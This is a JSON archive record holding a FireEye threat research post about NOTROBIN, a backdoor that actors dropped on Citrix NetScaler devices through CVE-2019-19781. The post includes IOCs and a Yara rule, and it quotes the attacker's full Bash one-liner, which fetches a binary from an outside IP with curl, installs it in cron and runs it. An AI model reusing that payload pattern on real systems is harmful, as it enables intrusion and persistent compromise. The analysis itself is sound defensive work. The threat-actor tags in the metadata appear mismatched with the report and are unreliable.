@@ -1,0 +1,161 @@
+{
+    "id": "c0969e6a-d2cf-4957-acc0-0948e6884adb",
+    "created_at": "2023-01-12T15:07:01.072862Z",
+    "updated_at": "2025-03-27T02:15:11.076779Z",
+    "deleted_at": null,
+    "sha1_hash": "a147a8909bbbed7c46e1d99107785f789845c224",
+    "title": "2020-01-17 - 404 Exploit Not Found- Vigilante Deploying Mitigation for Citrix NetScaler Vulnerability While Maintaining Backdoor",
+    "authors": "",
+    "file_creation_date": "2022-05-27T21:11:15Z",
+    "file_modification_date": "2022-05-27T21:11:15Z",
+    "file_size": 101910,
+    "plain_text": "# Vigilante Deploying Mitigation for Citrix NetScaler Vulnerability While Maintaining Backdoor\n\n**fireeye.com/blog/threat-research/2020/01/vigilante-deploying-mitigation-for-citrix-netscaler-vulnerability-while-**\nmaintaining-backdoor.html\n\nThreat Research\n\nWilliam Ballenthin, Josh Madeley\n\nJan 15, 2020\n\n8 mins read\n\nIncident Response\n\nMalware\n\nThreat Research\n\n\n-----\n\n[As noted in Rough Patch: I Promise It ll Be 200 OK, our](https://www.fireeye.com/blog/products-and-services/2020/01/rough-patch-promise-it-will-be-200-ok.html) [FireEye Mandiant Incident Response](https://www.fireeye.com/advantage)\nteam has been hard at work responding to intrusions stemming from the exploitation of CVE2019-19781. After analyzing dozens of successful exploitation attempts against Citrix ADCs\nthat did not have the [Citrix mitigation steps implemented, we’ve recognized multiple groups](https://support.citrix.com/article/CTX267679)\nof post-exploitation activity. Within these, something caught our eye: one particular threat\nactor that’s been deploying a previously-unseen payload for which we’ve created the code\nfamily NOTROBIN.\n\nUpon gaining access to a vulnerable NetScaler device, this actor cleans up known malware\nand deploys NOTROBIN to block subsequent exploitation attempts! But all is not as it\nseems, as NOTROBIN maintains backdoor access for those who know a secret passphrase.\nFireEye believes that this actor may be quietly collecting access to NetScaler devices for a\nsubsequent campaign.\n\n**Initial Compromise**\n\nThis actor exploits NetScaler devices using CVE-2019-19781 to execute shell commands on\nthe compromised device. They issue an HTTP POST request from a Tor exit node to\ntransmit the payload to the vulnerable newbm.pl CGI script. For example, Figure 1 shows a\nweb server access log entry recording exploitation:\n\n127.0.0.2 - - \"POST\n\n/vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\" 304 - \"-\" \"curl/7.67.0\"\n\nFigure 1: Web log showing exploitation\n\nUnlike other actors, this actor appears to exploit devices using a single HTTP POST request\nthat results in an HTTP 304 response—there is no observed HTTP GET to invoke staged\ncommands. Unfortunately, we haven’t recovered the POST body contents to see how it\nworks. In any case, exploitation causes the Bash one liner shown in Figure 2 to run on the\ncompromised system:\n\npkill -9 netscalerd; rm /var/tmp/netscalerd; mkdir /tmp/.init; curl -k\n\nhxxps://95.179.163[.]186/wpcontent/uploads/2018/09/64d4c2d3ee56af4f4ca8171556d50faa -o\n\n/tmp/.init/httpd; chmod 744 /tmp/.init/httpd; echo \"* * * * *\n\n/var/nstmp/.nscache/httpd\" | crontab -; /tmp/.init/httpd &\"\n\nFigure 2: Bash exploit payload\n\n[This is the same methodology as described in Rough Patch: I Promise It'll Be 200 OK. The](https://www.fireeye.com/blog/products-and-services/2020/01/rough-patch-promise-it-will-be-200-ok.html)\neffects of this series of commands includes:\n\n\n-----\n\n1. Kill and delete all running instances of netscalerd—a common process name used for\n\ncryptocurrency mining utilities deployed to NetScaler devices.\n2. Creates a hidden staging directory /tmp/.init, download NOTROBIN to it, and enable\n\nthe execute permission.\n3. Install /var/nstmp/.nscache/httpd for persistence via the cron daemon. This is the path\n\nto which NOTROBIN will copy itself.\n4. Manually execute NOTROBIN.\n\nThere’s a lot to unpack here. Of note, the actor removes malware known to target NetScaler\ndevices via the CVE-2019-19781 vulnerability. Cryptocurrency miners are generally easy to\nidentify—just look for the process utilizing nearly 100% of the CPU. By uninstalling these\nunwanted utilities, the actor may hope that administrators overlook an obvious compromise\nof their NetScaler devices.\n\nThe actor uses curl to fetch NOTROBIN from the hosting server with IP address\n95.179.163[.]186 that appears to be an abandoned WordPress site. FireEye has identified\nmany payloads hosted on this server, each named after their embedded authentication key.\nInterestingly, we haven’t seen reuse of the same payload across multiple clients.\nCompartmenting payloads indicates the actor is exercising operational security.\n\nFireEye has recovered cron syslog entries, such as those shown in Figure 3, that confirm the\npersistent installation of NOTROBIN. Note that these entries appear just after the initial\ncompromise. This is a robust indicator of compromise to triage NetScaler devices.\n\nJan 12 21:57:00 <cron.info> foo.netscaler /usr/sbin/cron[73531]:\n(nobody) CMD (/var/nstmp/.nscache/httpd)\n\nFigure 3: cron log entry showing NOTROBIN execution\n\nNow, let’s turn our attention to what NOTROBIN does.\n\n**Analysis of NOTROBIN**\n\nNOTROBIN is a utility written in Go 1.10 and compiled to a 64-bit ELF binary for BSD\nsystems. It periodically scans for and deletes files matching filename patterns and content\ncharacteristics. The purpose seems to be to block exploitation attempts against the CVE2019-19781 vulnerability; however, FireEye believes that NOTROBIN provides backdoor\naccess to the compromised system.\n\nWhen executed, NOTROBIN ensures that it is running from the path\n/var/nstmp/.nscache/httpd. If not, the utility copies itself to this path, spawns the new copy,\nand then exits itself. This provides detection cover by migrating the process from /tmp/, a\nsuspicious place for long-running processes to execute, to an apparently NetScaler-related,\nhidden directory.\n\n\n-----\n\nNow the fun begins: it spawns two routines that periodically check for and delete exploits.\n\nEvery second, NOTROBIN searches the directory /netscaler/portal/scripts/ for entries\ncreated within the last 14 days and deletes them, unless the filename or file content contains\na hardcoded key (example: 64d4c2d3ee56af4f4ca8171556d50faa). Open source reporting\nindicates that some actors write scripts into this directory after exploiting CVE-2019-19781.\nTherefore, we believe that this routine cleans the system of publicly known payloads, such\nas [PersonalBookmark.pl.](https://isc.sans.edu/diary/Citrix+ADC+Exploits+are+Public+and+Heavily+Used.+Attempts+to+Install+Backdoor/25700)\n\nEight times per second, NOTROBIN searches for files with an .xml extension in the directory\n/netscaler/portal/templates/. This is the directory into which exploits for CVE-2019-19781\nwrite templates containing attacker commands. NOTROBIN deletes files that contain either\nof the strings block or BLOCK, which likely match potential exploit code, such as that found\nin the [ProjectZeroIndia exploit; however, the utility does not delete files with a filename](https://github.com/projectzeroindia/CVE-2019-19781/blob/master/CVE-2019-19781.sh#L20)\ncontaining the secret key.\n\nFireEye believes that actors deploy NOTROBIN to block exploitation of the CVE-2019-19781\nvulnerability while maintaining backdoor access to compromised NetScaler devices. The\nmitigation works by deleting staged exploit code found within NetScaler templates before it\ncan be invoked. However, when the actor provides the hardcoded key during subsequent\nexploitation, NOTROBIN does not remove the payload. This lets the actor regain access to\nthe vulnerable device at a later time.\n\nAcross multiple investigations, FireEye observed actors deploying NOTROBIN with unique\nkeys. For example, we’ve recovered nearly 100 keys from different binaries. These look like\nMD5 hashes, though FireEye has been unsuccessful in recovering any plaintext. Using\ncomplex, unique keys makes it difficult for third parties, such as competing attackers or\nFireEye, to easily scan for NetScaler devices “protected” by NOTROBIN. This actor follows a\nstrong password policy!\n\nBased on strings found within NOTROBIN, the actor appears to inject the key into the Go\nproject using source code files named after the key. Figure 4 and Figure 5 show examples of\nthese filenames.\n\n/tmp/b/.tmpl_ci/64d4c2d3ee56af4f4ca8171556d50faa.go\n\nFigure 4: Source filename recovered from NOTROBIN sample\n\n/root/backup/sources/d474a8de77902851f96a3b7aa2dcbb8e.go\n\nFigure 5: Source filename recovered from NOTROBIN sample\n\n\n-----\n\nWe wonder if tmpl_ci refers to a Continuous Integration setup that applies source code\ntemplating to inject keys and build NOTROBIN variants. We also hope the actor didn’t have\nto revert to backups after losing the original source!\n\n**Outstanding Questions**\n\nNOTROBIN spawns a background routine that listens on UDP port 18634 and receives data;\nhowever, it drops the data without inspecting it. You can see this logic in Figure 6. FireEye\nhas not uncovered a purpose for this behavior, though DCSO [makes a strong case for this](https://blog.dcso.de/a-curious-case-of-cve-2019-19781-palware-remove_bds/)\nbeing used as a mutex, as only a single listener can be active on this port.\n\n\nNOTROBIN logic that drops UDP traffic\n\n\nFigure 6: NOTROBIN logic that drops UDP traffic\nThere is also an empty function main.install_cron whose implementation has been removed,\nso alternatively, perhaps these are vestiges of an early version of NOTROBIN. In any case, a\nNetScaler device listening on UDP port 18634 is a reliable indicator of compromise. Figure 7\n\n\n-----\n\nshows an example of listing the open file handles on a compromised NetScaler device,\nincluding a port listening on UDP 18634.\n\n\nFile handling listing of compromised NetScaler device\n\n\nFigure 7: File handling listing of compromised NetScaler device\n\n**NOTROBIN Efficacy**\n\nDuring one engagement, FireEye reviewed forensic evidence of NetScaler exploitation\nattempts against a single device, both before and after NOTROBIN was deployed by an\nactor. Prior to January 12, before NOTROBIN was installed, we identified successful attacks\nfrom multiple actors. But, across the following three days, more than a dozen exploitation\nattempts were thwarted by NOTROBIN. In other words, NOTROBIN inoculated the\nvulnerable device from further compromise. For example, Figure 8 shows a log message that\nrecords a failed exploitation attempt.\n\n\n-----\n\n127.0.0.2 - - \"GET\n\n/vpn/../vpns/portal/wTyaINaDVPaw8rmh.xml HTTP/1.1\" 404 48 \"-\"\n\n\"curl/7.47.0\"\n\nFigure 8: Web log entry showing a failed exploitation attempt\n\nNote that the application server responded with HTTP 404 (“Not Found”) as this actor\nattempts to invoke their payload staged in the template wTyaINaDVPaw8rmh.xml.\nNOTROBIN deleted the malicious template shortly after it was created – and before it could\nbe used by the other actor.\n\nFireEye has not yet identified if the actor has returned to NOTROBIN backdoors.\n\n**Conclusion**\n\nFireEye believes that the actor behind NOTROBIN has been opportunistically compromising\nNetScaler devices, possibly to prepare for an upcoming campaign. They remove other\nknown malware, potentially to avoid detection by administrators that check into their devices\n[after reading Citrix security bulletin CTX267027. NOTROBIN mitigates CVE-2019-19781 on](https://support.citrix.com/article/https://support.citrix.com/article/CTX267027)\ncompromised devices but retains a backdoor for an actor with a secret key. While we haven’t\nseen the actor return, we’re skeptical that they will remain a Robin Hood character protecting\nthe internet from the shadows.\n\n**Indicators of Compromise and Discovery**\n\nTable 1 lists indicators that match NOTROBIN variants that FireEye has identified. The\ndomain vilarunners[.]cat is the WordPress site that hosted NOTROBIN payloads. The\ndomain resolved to 95.179.163[.]186 during the time of observed activity. As of January 15,\nthe vilarunners[.]cat domain currently resolves to a new IP address of 80.240.31[.]218.\n\n**IOC Item** **Value**\n\nHTTP URL prefix hxxps://95[.]179.163.186/wp-content/uploads/2018/09/\n\nDirectory /var/nstmp/.nscache\n\nFilename /var/nstmp/.nscache/httpd\n\nDirectory /tmp/.init\n\nFilename /tmp/.init/httpd\n\n\n-----\n\nCrontab entry /var/nstmp/.nscache/httpd\n\nListening UDP port 18634\n\nRemote IP 95.179.163[.]186\n\nRemote IP 80.240.31[.]218\n\nDomain vilarunners[.]cat\n\nTable 1: Indicators of Compromise\n\n**Discovery on VirusTotal**\n\nYou can use the following VTI queries to identify NOTROBIN variants on VirusTotal:\n\nvhash:\"73cee1e8e1c3265c8f836516c53ae042\"\nvhash:\"e57a7713cdf89a2f72c6526549d22987\"\n\nNote, the vHash implementation is private, so we’re not able to confirm why this technique\nworks. In practice, the vHashes cover the same variants identified by the Yara rule listed in\nFigure 9.\n\nrule NOTROBIN\n\n{\n\nmeta:\n\nauthor = \"william.ballenthin@fireeye.com\"\n\ndate_created = \"2020-01-15\"\n\nstrings:\n\n$func_name_1 = \"main.remove_bds\"\n\n$func_name_2 = \"main.xrun\"\n\ncondition:\n\nall of them\n\n}\n\n\n-----\n\nFigure 9: Yara rule that matches on NOTROBIN variants\n\n**Recovered Authentication Keys**\n\nFireEye has identified nearly 100 hardcoded keys from NOTROBIN variants that the actor\ncould use to re-enter compromised environments. We expect that these strings may be\nfound within subsequent exploitation attempts, either as filenames or payload content.\nAlthough we won’t publish them here out of concern for our customers, please reach out if\nyou’re looking for NOTROBIN within your environment and we can provide a list.\n\n**Acknowledgements**\n\nThank you to analysts across FireEye that are currently responding to this activity, including\n[Brandan Schondorfer for collecting and interpreting artifacts, Steven Miller for coordinating](https://twitter.com/4real_br4nd4n)\nanalysis, [Evan Reese for pivoting across intel leads, Chris Glyer for reviewing technical](https://twitter.com/reesespcres)\naspects, [Moritz Raabe for reverse engineering NOTROBIN samples, and Ashley Frazer for](https://twitter.com/m_r_tz)\nrefining the presentation and conclusions.\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-17 - 404 Exploit Not Found- Vigilante Deploying Mitigation for Citrix NetScaler Vulnerability While Maintaining Backdoor.pdf"
+    ],
+    "report_names": [
+        "2020-01-17 - 404 Exploit Not Found- Vigilante Deploying Mitigation for Citrix NetScaler Vulnerability While Maintaining Backdoor.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "1dadf04e-d725-426f-9f6c-08c5be7da159",
+            "created_at": "2022-10-25T15:50:23.624538Z",
+            "updated_at": "2025-03-27T02:00:55.508759Z",
+            "deleted_at": null,
+            "main_name": "Darkhotel",
+            "aliases": [
+                "Darkhotel",
+                "DUBNIUM",
+                "Zigzag Hail"
+            ],
+            "source_name": "MITRE:Darkhotel",
+            "tools": null,
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
+            "created_at": "2022-10-25T16:07:24.471018Z",
+            "updated_at": "2025-03-27T02:02:10.24394Z",
+            "deleted_at": null,
+            "main_name": "Cron",
+            "aliases": [],
+            "source_name": "ETDA:Cron",
+            "tools": [
+                "Catelites",
+                "Catelites Bot",
+                "CronBot",
+                "TinyZBot"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "2b4eec94-7672-4bee-acb2-b857d0d26d12",
+            "created_at": "2023-01-06T13:46:38.272109Z",
+            "updated_at": "2025-03-27T02:00:02.790029Z",
+            "deleted_at": null,
+            "main_name": "DarkHotel",
+            "aliases": [
+                "DUBNIUM",
+                "Fallout Team",
+                "Luder",
+                "Tapaoux",
+                "Shadow Crane",
+                "APT-C-06",
+                "SIG25",
+                "Karba",
+                "Nemim",
+                "Nemin",
+                "G0012",
+                "ATK52",
+                "T-APT-02",
+                "TUNGSTEN BRIDGE",
+                "Zigzag Hail"
+            ],
+            "source_name": "MISPGALAXY:DarkHotel",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "e16a6567-2b9a-4419-960b-1e03fccc8812",
+            "created_at": "2023-01-06T13:46:39.128684Z",
+            "updated_at": "2025-03-27T02:00:03.003292Z",
+            "deleted_at": null,
+            "main_name": "NOTROBIN",
+            "aliases": [],
+            "source_name": "MISPGALAXY:NOTROBIN",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
+            "created_at": "2022-10-25T16:07:23.528994Z",
+            "updated_at": "2025-03-27T02:02:09.847683Z",
+            "deleted_at": null,
+            "main_name": "DarkHotel",
+            "aliases": [
+                "APT-C-06",
+                "ATK 52",
+                "CTG-1948",
+                "Dubnium",
+                "Fallout Team",
+                "Higaisa",
+                "Luder",
+                "Operation DarkHotel",
+                "Operation Daybreak",
+                "Operation Inexsmar",
+                "Operation PowerFall",
+                "Operation The Gh0st Remains the Same",
+                "SIG25",
+                "Shadow Crane",
+                "T-APT-02",
+                "Tungsten Bridge",
+                "Zigzag Hail"
+            ],
+            "source_name": "ETDA:DarkHotel",
+            "tools": [
+                "Asruex",
+                "DarkHotel",
+                "DmaUp3.exe",
+                "GreezeBackdoor",
+                "Karba",
+                "Nemain",
+                "Nemim",
+                "Ramsay",
+                "Retro",
+                "Tapaoux",
+                "Trojan.Win32.Karba.e",
+                "Virus.Win32.Pioneer.dx",
+                "igfxext.exe",
+                "msieckc.exe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536021,
+    "ts_updated_at": 1743041711,
+    "ts_creation_date": 1653685875,
+    "ts_modification_date": 1653685875,
+    "files": {
+        "pdf": "https://archive.orkl.eu/a147a8909bbbed7c46e1d99107785f789845c224.pdf",
+        "text": "https://archive.orkl.eu/a147a8909bbbed7c46e1d99107785f789845c224.txt",
+        "img": "https://archive.orkl.eu/a147a8909bbbed7c46e1d99107785f789845c224.jpg"
+    }
+}
